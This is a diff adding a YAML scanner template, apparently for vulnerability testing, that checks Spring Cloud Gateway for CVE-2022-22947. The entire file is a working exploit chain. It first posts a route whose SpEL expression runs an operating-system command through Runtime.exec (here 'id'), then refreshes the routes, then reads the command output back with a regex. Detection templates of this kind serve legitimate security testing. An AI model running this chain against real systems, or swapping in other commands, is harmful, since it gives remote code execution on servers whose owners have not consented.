@@ -1,0 +1,62 @@
+id: cve_2022_22947
+name: Spring Cloud Gateway RCE (CVE-2022-22947)
+transport: http
+port: 80
+severity: critical
+tags: ["web", "spring", "rce", "cve-2022-22947"]
+
+http:
+  scheme: http
+  any: false
+  requests:
+
+    - method: POST
+      path: /actuator/gateway/routes/66Sec
+      headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        Accept: "*/*"
+        Accept-Encoding: "gzip, deflate"
+        Accept-Language: "en"
+        Connection: "close"
+        Content-Type: "application/json"
+      body: |
+        {
+          "id": "WeianSec",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+            }
+          }],
+          "uri": "http://example.com"
+        }
+      matchers:
+        - type: status
+          status: 201
+
+    - method: POST
+      path: /actuator/gateway/refresh
+      headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        Accept: "*/*"
+        Accept-Encoding: "gzip, deflate"
+        Accept-Language: "en"
+        Connection: "close"
+      matchers:
+        - type: status
+          status: 200
+
+    - method: GET
+      path: /actuator/gateway/routes/66Sec
+      headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        Accept: "*/*"
+        Accept-Encoding: "gzip, deflate"
+        Accept-Language: "en"
+        Connection: "close"
+      matchers:
+        - type: status
+          status: 200
+        - type: body_regex
+          regex: "Result = ['\"]?([^'\")]+)"
